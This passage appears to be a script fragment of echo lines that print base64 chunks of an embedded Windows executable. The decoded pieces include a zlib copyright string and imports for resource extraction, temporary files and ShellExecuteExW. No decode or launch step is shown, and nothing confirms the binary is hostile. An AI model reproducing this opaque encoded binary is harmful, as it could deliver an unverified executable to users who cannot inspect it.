echo fadA1RjA/G1O0J81K7cjjcUYlp+gfyonGUf9unwgQQKSj/QQ9+hIqD1YFJtYP6gj
echo tpAdMdP3oYlqz3YUD6jKrOEHf76EYMMG0nCgXrcXHOZZuKn0PN8VTIXnwtHggH5p
echo Di/Le2tId8OiDw3Lx2ixcynHBGFMoLjZ9ZhvRJD/0/x+UGbuGzfaVk0nuQ4oQAW2
echo xu+wpKOIDBwasNuBf9dnOZF40iv0H26TA/cmO2aQmoOIPy+R7ViTKVRgRLQxB/gM
echo 36hNHrrP8abs35L+ibguRmcXm1QCcCfsu0jwcd4vTMkwgPnbVedFY5ygP2v5x4PT
echo F2g2wXIPinnLN13krlDhXED/VE4lmOj2c4iLrhbvNxb4QIIEnSc+vCQf6SFBeFWZ
echo r9fgi8qwXDM7tlntXtHlVbB+UEfVGez/bCE7YglGh9rn6TLIgo6OcNSe7Six+VGQ
echo X1bkgjoxWDqDCY+n5m4zHwjBhg1tpjq1pOFAvcGG/AUvKUkXSk71r/N2IjKWEZ6K
echo eL4rmB3ZlyBLyfR4Lq5IwMAB/dKlZkFqHF6W93k5Kk+Xlp9d8vEj5QUZa01gftf1
echo jtFi5+u23l9SjgnCN+m1etlGAGi8IbzQ6jHfiI9WYzBh+dYiBJ5qmr2mvQfYwQG/
echo Nm60rVMJCBWaTnId/ynOpRGGe7d04ccPzdkQkqi+rCpGERk4I3algHVmxtgQAXpg
echo /q7PcpvJc8oi8aRXR5YY76k5rf3MXhFFBu5NdmOJ8c6NJkTc6EH4ZFF5L/k0HpNB
echo 2rEmU7/WmuvpxvmzjKFFC2IO8BkHaUyhvlGbPNs2J4Q1mZKWUP4uLpm5VCb83uie
echo EnFdjHcW4TTOLjapq0mKEUXmPwMggYO7dpHg4xP2XFv9WelJmD5V8SEGgmxEYT7U
echo qs6Lxs+pN344QX/WXSbDbrOJdnzW7srEb9YdWQqxoeHkHhTzgXmoS9dpyxOyDner
echo XKHCuTnGfgGA/qmc5ZkVJAs2oDZuURyOpxZmhsJx2j4s3m8sSbnTlPCBBAmV5rix
echo e0kNox4usRtIPtJDLVlu+8P22+mmkWdRH6mwzHrODHSUYblm8QYF3gAAAAB3BzCW
echo 7g5hLJkJUboHbcQZcGr0j+ljpTWeZJWjDtuIMnncuKTg1ekel9LZiAm2TCt+sXy9
echo 57gtB5C/HZEdtxBkarAg8vO5cUiEvkHeGtrUfW3d5Ov01LVRg9OFxxNsmFZka6jA
echo /WL5eoplyewUAVxPYwZs2foPPWONCA31O24gyExpEF7VYEHkomdxcjwD5NFLBNRH
echo 0g2F/aUKtWs1taj6QrKYbNu7ydasvPlAMths40XfXHXc1g3Pq9E9WSbZMKxR3gA6
echo yNdRgL/QYRYhtPS1VrPEI8+6lZm4vaUPKAK4nl8FiAjGDNmysQvpJC9vfIdYaEwR
echo wWEdq7ZmLT123EGQAdtxBpjSILzv1RAqcbGFiQa2tR+fv+Sl6LjUM3gHyaIPAPk0
echo lgmojuEOmBh/ag27CG09LZFkbJfmY1wBa2tR9BxsYWKFZTDY8mIATmwGle0bAaV7
echo ggj0wfUPxFdlsNnGErfpUIu+uOr8uYh8Yt0d3xXaLUmM03zz+9RMZU2yYVg6tVHO
echo o7wAdNS7MOJK36VBPdiV16TRxG3T1vT7Q2npajRu2fytZ4hG2mC40EQELXMzAx3l
echo qgpMX90NfMlQBXE8JwJBqr4LEBDJDCCGV2i1JSBvhbO5ZtQJzmHkn17e+Q4p2cmY
echo sNCYIsfXqLRZsz0XLrQNgbe9XDvAumyt7biDIJq/s7YDtuIMdLHSmurVRzmd0nev
echo BNsmFXPcFoPjYwsSlGQ7hA1taj56alqo5A7PC5MJ/50KAK4nfQeesfAPk0SHCKPS
echo HgHyaGkGwv73YlddgGVnyxlsNnFuawbn/tQbdonTK+AQ2npaZ91KzPm532+Ovu/5
echo F7e+Q2CwjtXW1qPoodGTfjjYwsRP3/JS0btn8aa8V2c/tQbdSLI2S9gNK9qvChtM
echo NgNK9kEEemDfYO/DqGffVTFuju9Gab55y2GzjLxmgxolb9KgUmjiNswMd5W7C0cD
echo IgIWuVUFJi/Fuju+sr0LKCu0WpJcs2oEwtf/p7XQzzEs2Z6LW96uHZtkwrDsY/Im
echo dWqjnAJtkwqcCQap6w42P3IHZ4UFAFcTlb9KguK4ehR7sSuuDLYbOJLSjpvl1b4N
echo fNzvtwvb3yGG09LU8dTiQmjds/gf2oNugb4Wzfa5JltvsHfhGLdHd4gIWub/D2pw
echo ZgY7yhEBC1yPZZ7/+GKuaWFr/9MWbM9FoArieNcN0u5OBINUOQOzwqdnJmHQYBb3
echo SWlHTT5ud9uu0WpK2dZa3EDfC2Y32DvwqbyuU967nsVHss9/MLX/6b298hzKusKK
echo U7OTMCS0o6a60DYFzdcGk1TeVykj2We/s2Z6LsRhSrhdaBsCKm8rlLQLvjfDDI6h
echo WgXfGy0C740AAAAAGRsxQTI2YoIrLVPDZGzFBH139EVWWqeGT0GWx8jZigjRwrtJ
echo +u/oiuP02custU8Mta5+TZ6DLY6HmBzPSsISUVPZIxB49HDTYe9Bki6u11U3teYU
echo HJi11wWDhJaCG5hZmwCpGLAt+tupNsua5nddXf9sbBzUQT/fzVoOnpWEJKKMnxXj
echo p7JGIL6pd2Hx6OGm6PPQ58PegyTaxbJlXV2uqkRGn+tva8wodnD9aTkxa64gKlrv
echo CwcJLBIcOG3fRjbzxl0Hsu1wVHH0a2Uwuyrz96IxwraJHJF1kAegNBefvPsOhI26
echo JaneeTyy7zhz83n/auhIvkHFG31Y3io88HlPBelifkTCTy2H21QcxpQVigGNDrtA
echo piPog7842cI4oMUNIbv0TAqWp48TjZbOXMwACUXXMUhu+mKLd+FTyrq7XVSjoGwV
echo iI0/1pGWDpfe15hQx8ypEezh+tL1+suTcmLXXGt55h1AVLXeWU+EnxYOElgPFSMZ
echo JDhw2j0jQZtl/WunfOZa5lfLCSVO0DhkAZGuoxiKn+Izp8whKrz9YK0k4a+0P9Du
echo nxKDLYYJsmzJSCSr0FMV6vt+RiniZXdoLz959jYkSLcdCRt0BBIqNUtTvPJSSI2z
echo eWXecGB+7zHn5vP+/v3Cv9XQkXzMy6A9g4o2+pqRB7uxvFR4qKdlOTuDmEsimKkK
echo CbX6yRCuy4hf711PRvRsDm3ZP810wg6M81oSQ+pBIwLBbHDB2HdBgJc210eOLeYG
echo pQC1xbwbhIRxQYoaaFq7W0N36JhabNnZFS1PHgw2fl8nGy2cPgAc3bmYABKggzFT
echo i65ikJK1U9Hd9MUWxO/0V+/Cp5T22ZbVrge86bccjaicMd5rhSrvKspree3TcEis
echo +F0bb+FGKi5m3jbhf8UHoFToVGNN82UiArLz5RupwqQwhJFnKZ+gJuTFrrj93p/5
echo 1vPMOs/o/XuAqWu8mbJa/bKfCT6rhDh/LBwksDUHFfEeKkYyBzF3c0hw4bRRa9D1
echo ekaDNmNdsnfL+tdO0uHmD/nMtczg14SNr5YSSraNIwudoHDIhLtBiQMjXUYaOGwH
echo MRU/xCgODoVnT5hCflSpA1V5+sBMYsuBgTjFH5gj9F6zDqedqhWW3OVUABv8TzFa
echo 12Jimc55U9hJ4U8XUPp+VnvXLZVizBzULY2KEzSWu1Ifu+iRBqDZ0F5+8+xHZcKt
echo bEiRbnVToC86EjboIwkHqQgkVGoRP2Urlqd55I+8SKWkkRtmvYoqJ/LLvODr0I2h
echo wP3eYtnm7yMUvOG9DafQ/CaKgz8/kbJ+cNAkuWnLFfhC5kY7W/13etxla7XFflr0
echo 7lMJN/dIOHa4Ca6xoRKf8Io/zDOTJP1yAAAAAAHCajcDhNRuAka+WQcJqNwGy8Lr
echo BI18sgVPFoUOE1G4D9E7jw2XhdYMVe/hCRr5ZAjYk1MKni0KC1xHPRwmo3Ad5MlH
echo H6J3Hh5gHSkbLwusGu1hmxir38IZabX1EjXyyBP3mP8RsSamEHNMkRU8WhQU/jAj
echo FriOehd65E04TUbgOY8s1zvJko46C/i5P0TuPD6GhAs8wDpSPQJQZTZeF1g3nH1v
echo NdrDNjQYqQExV7+EMJXVszLTa+ozEQHdJGvlkCWpj6cn7zH+Ji1bySNiTUwioCd7
echo IOaZIiEk8xUqeLQoK7reHyn8YEYoPgpxLXEc9CyzdsMu9ciaLzeirXCajcBxWOf3
echo cx5ZrnLcM5l3kyUcdlFPK3QX8XJ11ZtFfonceH9Ltk99DQgWfM9iIXmAdKR4Qh6T
echo egSgynvGyv1svC6wbX5Eh284+t5u+pDpa7WGbGp37FtoMVICafM4NWKvfwhjbRU/
echo YSurZmDpwVFlptfUZGS942YiA7pn4GmNSNfLIEkVoRdLUx9OSpF1eU/eY/xOHAnL
echo TFq3kk2Y3aVGxJqYRwbwr0VATvZEgiTBQc0yREAPWHNCSeYqQ4uMHVTxaFBVMwJn
echo V3W8Pla31glT+MCMUjqqu1B8FOJRvn7VWuI56FsgU99ZZu2GWKSHsV3rkTRcKfsD
echo Xm9FWl+tL23hNRuA4Pdxt+Kxz+7jc6XZ5jyzXOf+2WvluGcy5HoNBe8mSjju5CAP
echo 7KKeVu1g9GHoL+Lk6e2I0+urNorqaVy9/RO48PzR0sf+l2ye/1UGqfoaECz72Hob
echo +Z7EQvhcrnXzAOlI8sKDf/CEPSbxRlcR9AlBlPXLK6P3jZX69k//zdl4XWDYujdX
echo 2vyJDts+4znecfW837Ofi931IdLcN0vl12sM2NapZu/U79i21S2ygdBipATRoM4z
echo 0+ZwatIkGl3FXv4QxJyUJ8baKn7HGEBJwldWzMOVPPvB04KiwBHolctNr6jKj8Wf
echo yMl7xskLEfHMRAd0zYZtQ8/A0xrOArktka+WQJBt/HeSK0Iuk+koGZamPpyXZFSr
echo lSLq8pTggMWfvMf4nn6tz5w4E5ad+nmhmLVvJJl3BRObMbtKmvPRfY2JNTCMS18H
echo jg3hXo/Pi2mKgJ3si0L324kESYKIxiO1g5pkiIJYDr+AHrDmgdza0YSTzFSFUaZj
echo hxcYOobVcg2p4tCgqCC6l6pmBM6rpG75rut4fK8pEkutb6wSrK3GJafxgRimM+sv
echo pHVVdqW3P0Gg+CnEoTpD86N8/aqivpedtcRz0LQGGee2QKe+t4LNibLN2wyzD7E7
echo sUkPYrCLZVW71yJouhVIX7hT9ga5kZwxvN6KtL0c4IO/Wl7avpg07QAAAAC4vGdl
echo qgnIixK1r+6PYpdXN97wMiVrX9yd1zi5xbQo730IT4pvveBk1wGHAUrWv7jyatjd
echo 4N93M1hjEFZQGVef6KUw+voQnxRCrPhx33vAyGfHp611cghDzc5vJpWtf3AtERgV
echo P6S3+4cY0J4az+gnonOPQrDGIKwIekfJoDKvPhiOyFsKO2e1socA0C9QOGmX7F8M
echo hVnw4j3ll4dlhofR3TrgtM+PT1p3Myg/6uQQhlJYd+NA7dgN+FG/aPAr+KFIl5/E
echo WiIwKuKeV09/SW/2x/UIk9VAp31t/MAYNZ/QTo0jtyuflhjFJyp/oLr9RxkCQSB8
echo EPSPkqhI6PebFFg9I6g/WDEdkLaJoffTFHbPaqzKqA++fwfhBsNghF6gcNLmHBe3
echo 9Km4WUwV3zzRwueFaX6A4HvLLw7Dd0hryw0PonOxaMdhBMcp2bigTERvmPX80/+Q
echo 7mZQflbaNxsOuSdNtgVAKKSw78YcDIijgduwGjln138r0niRk24f9Dsm9wODmpBm
echo kS8/iCmTWO20RGBUDPgHMR5NqN+m8c+6/pLf7EYuuIlUmxdn7CdwAnHwSLvJTC/e
echo 2/mAMGNF51VrP6Cc04PH+cE2aBd5ig9y5F03y1zhUK5OVP9A9uiYJa6LiHMWN+8W
echo BIJA+Lw+J50h6R8kmVV4QYvg168zXLDK7Vm2O1Xl0V5HUH6w/+wZ1WI7IWzah0YJ
echo yDLp53COjoIo7Z7UkFH5sYLkVl86WDE6p48Jgx8zbuYNhsEItTqmbb1A4aQF/IbB
echo F0kpL6/1TkoyInbzip4Rlpgrvnggl9kdePTJS8BIri7S/QHAakFmpfeWXhxPKjl5
echo XZ+Wl+Uj8fJNaxkF9dd+YOdi0Y5f3rbrwgmOUnq16TdoAEbZ0LwhvIjfMeowY1aP
echo Itb5YZpqngQHvaa9vwHB2K20bjYVCAlTHXJOmqXOKf+3e4YRD8fhdJIQ2c0qrL6o
echo OBkRRoCldiPYxmZ1YHoBEHLPrv7Kc8mbV6TxIu8Ylkf9rTmpRRFezHZN7gbO8Ylj
echo 3EQmjWT4Qej5L3lRQZMeNFMmsdrrmta/s/nG6QtFoYwZ8A5ioUxpBzybUb6EJzbb
echo lpKZNS4u/lAmVLmZnuje/IxdcRI04RZ3qTYuzhGKSasDP+ZFu4OBIOPgkXZbXPYT
echo SelZ/fFVPphsggYh1D5hRMaLzqp+N6nP1n9BOG7DJl18domzxMru1lkd1m/hobEK
echo 8xQe5EuoeYETy2nXq3cOsrnCoVwBfsY5nKn+gCQVmeU2oDYLjhxRboZmFqc+2nHC
echo LG/eLJTTuUkJBIHwsbjmlaMNSXsbsS4eQ9I+SPtuWS3p2/bDUWeRpsywqR90DM56
echo ZrlhlN4FBvEgaW5mbGF0ZSAxLjIuMTEgQ29weXJpZ2h0IDE5OTUtMjAxNyBNYXJr
echo IEFkbGVyIAADAAQABQAGAAcACAAJAAoACwANAA8AEQATABcAGwAfACMAKwAzADsA
echo QwBTAGMAcwCDAKMAwwDjAAIBAAAAAAAAEAAQABAAEAAQABAAEAAQABEAEQARABEA
echo EgASABIAEgATABMAEwATABQAFAAUABQAFQAVABUAFQAQAE0AygAAAAEAAgADAAQA
echo BQAHAAkADQARABkAIQAxAEEAYQCBAMEAAQGBAQECAQMBBAEGAQgBDAEQARgBIAEw
echo AUABYAAAAAAQABAAEAAQABEAEQASABIAEwATABQAFAAVABUAFgAWABcAFwAYABgA
echo GQAZABoAGgAbABsAHAAcAB0AHQBAAEAAIGNBADBjQQA7Y0EAPGNBAEhjQQBYY0EA
echo ZGNBAHhjQQCIY0EAO2NBAG5lZWQgZGljdGlvbmFyeQBzdHJlYW0gZW5kAABmaWxl
echo IGVycm9yAABzdHJlYW0gZXJyb3IAAAAAZGF0YSBlcnJvcgAAaW5zdWZmaWNpZW50
echo IG1lbW9yeQBidWZmZXIgZXJyb3IAAAAAaW5jb21wYXRpYmxlIHZlcnNpb24AAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AP////8AAAAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAJCQAAAKAAAAIAAAACoA
echo AAA6AAAAPwAAAFwAAAB8AAAAbwBwAGUAbgAAAHMAeQBzAG4AYQB0AGkAdgBlAAAA
echo KgAqAAAADQAKAAAAAACQkAAAAAD/////BAAAAP////8EAAAA/////3871QZkvqk9
echo u46OkY7AjZiXmozg0dCtm5SbnYzgjJib4JuIjI6fnYyXkZLgkJ+MmK2blJudjOCM
echo mJvgiZGOlZeSmeCcl46bnYyRjoeezpufjpmNns6bl5KdmpeUm5CfjJiezpuXkp2a
echo l5SbnZGLkoyezpuXkp2al5SbnZOc0Z3Sm4ib0p6fjJuIjJwAAQAAAEQwQQD/////
echo kOJNNz8SZUWRZDnEkl5GewAQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////9EcgEA
echo AAAAAAAAAACmdgEAcHQBAIhyAQAAAAAAAAAAAEJ4AQC0dAEAnHMBAAAAAAAAAAAA
echo uH4BAMh1AQAkdAEAAAAAAAAAAADWfgEAUHYBACx0AQAAAAAAAAAAAPh+AQBYdgEA
echo NHQBAAAAAAAAAAAARn8BAGB2AQBEdAEAAAAAAAAAAABkfwEAcHYBAEx0AQAAAAAA
echo AAAAAI5/AQB4dgEAWHQBAAAAAAAAAAAAAoABAIR2AQAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAJx2AQBQeAEAWngBAGR4AQBueAEAeHgBAIR4AQCOeAEAlngBAKJ4AQCseAEA
echo tngBAMB4AQDKeAEA1HgBAN54AQAAAAAAsnYBAMZ2AQDUdgEA5HYBAPJ2AQAAdwEA
echo DHcBACB3AQAydwEASHcBAFZ3AQBqdwEAgHcBAJZ3AQCodwEAuHcBAMp3AQDadwEA
echo 6ncBAAB4AQAUeAEALHgBAOh4AQAAeQEADnkBACZ5AQBCeQEAWHkBAGp5AQB6eQEA
echo gnkBAJR5AQCkeQEAunkBAMZ5AQDSeQEA4nkBAPh5AQAOegEAJHoBAD56AQBYegEA
echo bHoBAIB6AQCeegEAqnoBAMB6AQDUegEA6noBAPp6AQAIewEAIHsBADh7AQBGewEA
echo WHsBAGJ7AQBwewEAfnsBAIp7AQCYewEAsHsBAM57AQDkewEA9HsBAAR8AQAWfAEA
echo KnwBADx8AQAAAAAAWnwBAGh8AQB2fAEAhHwBAJZ8AQCmfAEAuHwBANB8AQDifAEA
echo 9nwBAAJ9AQAQfQEAJH0BADZ9AQBGfQEAWn0BAGx9AQB+fQEAjn0BAJp9AQC0fQEA
echo yn0BAN59AQDsfQEABH4BABh+AQAsfgEARn4BAFZ+AQBsfgEAiH4BAJp+AQCofgEA
echo AAAAAMR+AQAAAAAA4H4BAAAAAAAGfwEAGH8BAC5/AQAAAAAAUn8BAAAAAABufwEA
echo fn8BAAAAAACYfwEArH8BAMR/AQDYfwEA6n8BAAAAAACcdgEAUHgBAFp4AQBkeAEA
echo bngBAHh4AQCEeAEAjngBAJZ4AQCieAEArHgBALZ4AQDAeAEAyngBANR4AQDeeAEA
echo AAAAALJ2AQDGdgEA1HYBAOR2AQDydgEAAHcBAAx3AQAgdwEAMncBAEh3AQBWdwEA
echo ancBAIB3AQCWdwEAqHcBALh3AQDKdwEA2ncBAOp3AQAAeAEAFHgBACx4AQDoeAEA
echo AHkBAA55AQAmeQEAQnkBAFh5AQBqeQEAenkBAIJ5AQCUeQEApHkBALp5AQDGeQEA
echo 0nkBAOJ5AQD4eQEADnoBACR6AQA+egEAWHoBAGx6AQCAegEAnnoBAKp6AQDAegEA
echo 1HoBAOp6AQD6egEACHsBACB7AQA4ewEARnsBAFh7AQBiewEAcHsBAH57AQCKewEA
echo mHsBALB7AQDOewEA5HsBAPR7AQAEfAEAFnwBACp8AQA8fAEAAAAAAFp8AQBofAEA
echo dnwBAIR8AQCWfAEApnwBALh8AQDQfAEA4nwBAPZ8AQACfQEAEH0BACR9AQA2fQEA
echo Rn0BAFp9AQBsfQEAfn0BAI59AQCafQEAtH0BAMp9AQDefQEA7H0BAAR+AQAYfgEA
echo LH4BAEZ+AQBWfgEAbH4BAIh+AQCafgEAqH4BAAAAAADEfgEAAAAAAOB+AQAAAAAA
echo Bn8BABh/AQAufwEAAAAAAFJ/AQAAAAAAbn8BAH5/AQAAAAAAmH8BAKx/AQDEfwEA
echo 2H8BAOp/AQAAAAAAmQJtZW1zZXQAAE1TVkNSVC5kbGwAAPoBR2V0TW9kdWxlSGFu
echo ZGxlVwAApAJIZWFwQ3JlYXRlAAA+AkdldFN0ZEhhbmRsZQAApQJIZWFwRGVzdHJv
echo eQAFAUV4aXRQcm9jZXNzAJcEV3JpdGVGaWxlAF0CR2V0VGVtcEZpbGVOYW1lVwAA
echo +AJMb2FkTGlicmFyeUV4VwAA8gBFbnVtUmVzb3VyY2VUeXBlc1cAAE0BRnJlZUxp
echo YnJhcnkAhgNSZW1vdmVEaXJlY3RvcnlXAADGAUdldEV4aXRDb2RlUHJvY2VzcwAA
echo 7gBFbnVtUmVzb3VyY2VOYW1lc1cAAHEBR2V0Q29tbWFuZExpbmVXAPsCTG9hZFJl
echo c291cmNlAAAqBFNpemVvZlJlc291cmNlAABQAUZyZWVSZXNvdXJjZQAAOgFGaW5k
echo UmVzb3VyY2VXAAcCR2V0TmF0aXZlU3lzdGVtSW5mbwA7AkdldFNob3J0UGF0aE5h
echo bWVXAIYCR2V0V2luZG93c0RpcmVjdG9yeVcAAEoCR2V0U3lzdGVtRGlyZWN0b3J5
echo VwBLRVJORUwzMi5kbGwAAOgCd2NzbmNtcACYAm1lbW1vdmUA6QJ3Y3NuY3B5AO0C
echo d2Nzc3RyAADuAV93Y3NuaWNtcADpAV93Y3NkdXAAXgJmcmVlAADqAV93Y3NpY21w
echo AADmAndjc2xlbgAA4wJ3Y3NjcHkAAOECd2NzY21wAACXAm1lbWNweQAA0wJ0b2xv
echo d2VyAN8Cd2NzY2F0AACRAm1hbGxvYwAA2gBFbnRlckNyaXRpY2FsU2VjdGlvbgAA
echo RABDbG9zZUhhbmRsZQD0AkxlYXZlQ3JpdGljYWxTZWN0aW9uAAC5AkluaXRpYWxp
echo emVDcml0aWNhbFNlY3Rpb24AbgRXYWl0Rm9yU2luZ2xlT2JqZWN0ADgEVGVybWlu
echo YXRlVGhyZWFkAKQAQ3JlYXRlVGhyZWFkAAArBFNsZWVwACICR2V0UHJvY0FkZHJl
echo c3MAAHsCR2V0VmVyc2lvbkV4VwCEBFdpZGVDaGFyVG9NdWx0aUJ5dGUAogJIZWFw
echo QWxsb2MApgJIZWFwRnJlZQAA+QJMb2FkTGlicmFyeVcAAKsBR2V0Q3VycmVudFBy
echo b2Nlc3NJZACuAUdldEN1cnJlbnRUaHJlYWRJZAAA9gFHZXRNb2R1bGVGaWxlTmFt
echo ZVcAAMQBR2V0RW52aXJvbm1lbnRWYXJpYWJsZVcA2QNTZXRFbnZpcm9ubWVudFZh
echo cmlhYmxlVwCqAUdldEN1cnJlbnRQcm9jZXNzADcEVGVybWluYXRlUHJvY2VzcwAA
echo HwRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAqwJIZWFwU2l6ZQAAHwNNdWx0
echo aUJ5dGVUb1dpZGVDaGFyAHIAQ3JlYXRlRGlyZWN0b3J5VwAA4gNTZXRGaWxlQXR0
echo cmlidXRlc1cAAF8CR2V0VGVtcFBhdGhXAADEAERlbGV0ZUZpbGVXAKkBR2V0Q3Vy
echo cmVudERpcmVjdG9yeVcAAM8DU2V0Q3VycmVudERpcmVjdG9yeVcAAIAAQ3JlYXRl
echo RmlsZVcA5wNTZXRGaWxlUG9pbnRlcgAAPQRUbHNGcmVlAD4EVGxzR2V0VmFsdWUA
echo PwRUbHNTZXRWYWx1ZQA8BFRsc0FsbG9jAACpAkhlYXBSZUFsbG9jAL8ARGVsZXRl
echo Q3JpdGljYWxTZWN0aW9uAL8CSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2UAAMIC
echo SW50ZXJsb2NrZWRFeGNoYW5nZQDnAUdldExhc3RFcnJvcgAA9ANTZXRMYXN0RXJy
echo b3IAAE8EVW5yZWdpc3RlcldhaXQAAK0BR2V0Q3VycmVudFRocmVhZAAA1QBEdXBs
echo aWNhdGVIYW5kbGUAeANSZWdpc3RlcldhaXRGb3JTaW5nbGVPYmplY3QAAABDaGFy
echo VXBwZXJXAAAAAENoYXJMb3dlclcAAAAATWVzc2FnZUJveFcAAABEZWZXaW5kb3dQ
echo cm9jVwAAAABEZXN0cm95V2luZG93AAAAR2V0V2luZG93TG9uZ1cAAAAAR2V0V2lu
echo ZG93VGV4dExlbmd0aFcAAAAAR2V0V2luZG93VGV4dFcAAAAAVW5yZWdpc3RlckNs
echo YXNzVwAAAABMb2FkSWNvblcAAABMb2FkQ3Vyc29yVwAAAFJlZ2lzdGVyQ2xhc3NF
echo eFcAAAAASXNXaW5kb3dFbmFibGVkAAAARW5hYmxlV2luZG93AAAAAEdldFN5c3Rl
echo bU1ldHJpY3MAAAAAQ3JlYXRlV2luZG93RXhXAAAAU2V0V2luZG93TG9uZ1cAAAAA
echo U2VuZE1lc3NhZ2VXAAAAAFNldEZvY3VzAAAAAENyZWF0ZUFjY2VsZXJhdG9yVGFi
echo bGVXAAAAU2V0Rm9yZWdyb3VuZFdpbmRvdwAAAEJyaW5nV2luZG93VG9Ub3AAAAAA
echo R2V0TWVzc2FnZVcAAABUcmFuc2xhdGVBY2NlbGVyYXRvclcAAABUcmFuc2xhdGVN
echo ZXNzYWdlAAAAAERpc3BhdGNoTWVzc2FnZVcAAAAARGVzdHJveUFjY2VsZXJhdG9y
echo VGFibGUAAABQb3N0TWVzc2FnZVcAAAAAR2V0Rm9yZWdyb3VuZFdpbmRvdwAAAEdl
echo dFdpbmRvd1RocmVhZFByb2Nlc3NJZAAAAABJc1dpbmRvd1Zpc2libGUAAABFbnVt
echo V2luZG93cwAAAFNldFdpbmRvd1BvcwAAVVNFUjMyLkRMTAAAAABHZXRTdG9ja09i
echo amVjdAAAR0RJMzIuRExMAAAASW5pdENvbW1vbkNvbnRyb2xzRXgAAENPTUNUTDMy
echo LkRMTAAAAABTaGVsbEV4ZWN1dGVFeFcAAABTSEdldEZvbGRlckxvY2F0aW9uAAAA
echo U0hHZXRQYXRoRnJvbUlETGlzdFcAAFNIRUxMMzIuRExMAAAAdGltZUJlZ2luUGVy
echo aW9kAFdJTk1NLkRMTAAAAENvSW5pdGlhbGl6ZQAAAABDb1Rhc2tNZW1GcmVlAE9M
echo RTMyLkRMTAAAAFBhdGhBZGRCYWNrc2xhc2hXAAAAUGF0aFJlbmFtZUV4dGVuc2lv
echo blcAAAAAUGF0aFF1b3RlU3BhY2VzVwAAAABQYXRoUmVtb3ZlQXJnc1cAAABQYXRo
echo UmVtb3ZlQmFja3NsYXNoVwAAU0hMV0FQSS5ETEwAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAEAAAAAAACAAoAAAAgAACAGAAAAFAAAIAAAAAAAAAAAAQAAAAEAAAA
echo MAEAgGgAAIByAQCAgAAAgIgBAICYAACAygEAgLAAAIAAAAAAAAAAAAQAAAAAAAEA
echo AQAAAMgAAIAAAAAAAAAAAAQAAAAAAAEAAAAAAOAAAAAAAAAAAAAAAAQAAAAAAAEA
echo AAAAAPAAAAAAAAAAAAAAAAQAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAQAAAAAAAEA
echo AAAAABABAAAAAAAAAAAAAAQAAAAAAAEAAAAAACABAAAckgEADgAAAOQEAAAAAAAA
echo LJIBAAEAAADkBAAAAAAAADCSAQCjBAAA5AQAAAAAAADUlgEADAAAAOQEAAAAAAAA
echo 4JYBAKACAADkBAAAAAAAACAAMAA2ADcAOQA3ADEAMABEAEYARQBCADQAQgA0ADUA
echo MQA0ADMAQwAzADUANwBDADYARABEAEEANgA0AEMARQA0AAoAMQA3ADcAMQAwAEQA
echo MABCAEUAOAAgADMAMQBGADUANgA1AEUAMQA3AEQAMAAwADIAMgA1AEYANAA2AEUA
echo RAA1AEQANgAxADIAMwA1ADcAMQBGAEIANQAoAEUANwBBAEYANAA0AEYAQgBEADYA
echo NgBGADkANgA5ADUARQA2ADcAQwA1ADcANAA2AEUARgBEADEAQgBEADQANwA0ADYA
echo RABGAEEAOABDADEAeJxjYBgFIxkAAAIAAAFQQQFQQUQaUSFJpDlsyl3amnve+fc3
echo f9TCrcO/bjy13RWVmchEUFkMJ33qiyHtOFtYl6ihtBRTRHkEjxqvhqWdnh1/mEPB
echo I1KU0RvZ86ClE4e03h16vnSc/SeodKhglZmclkXBj7fTqTtdj+ZBa6/52lNcMLyq
echo hSfxW5MOIIfyaitQOVl0DqVz3ZdmewVd3z2hmJ/Dcs9DsvmKra+f2FgEd8YMDaJh
echo sDWPC0M/LWocJ46RFdU3nEmo0CYYeOKpzidhgtAwphhY7xce97pDrxcyTq5X8q3B
echo ZJ48tluXdQM2vFfGxbAc9n8K5m1skrn+aLu5fVtxb5W28mWV6TzygSjTcMGToqFg
echo umbEFWyDXXjCi8VQGzLRzERMlof4U6TNatBKticxIKB1mU3sENym4kaSoKf8k/Dm
echo LBjC3v3P1SM4IcUZBImL/BR+wTwXNKY1XfFavkjztANdZlqLaYCxLujigTeCi76b
echo j+qeAMU6taV+oVk2ExxLtt8wsXMUeetJF6S7gvKf/+03cExmpXuKgI4YK9Zn8RvJ
echo YWnJSsRPVW2v2d+XjvZk1/C21i2nxE2tOHxFDBvnvybLWLek1c73f0iioj1RYzAJ
echo VAFwoVavbZWRc1qMrDYAilLoSsSDhQ2DNZEzRjSa54n9APorlEmPLT/P/sApogIx
echo nb2Ije3P0Q0kfE6A5IuCmbh/lNYxoHgDDMBA5IWLu3wDVZHJMy1cVgQFnPujpwyg
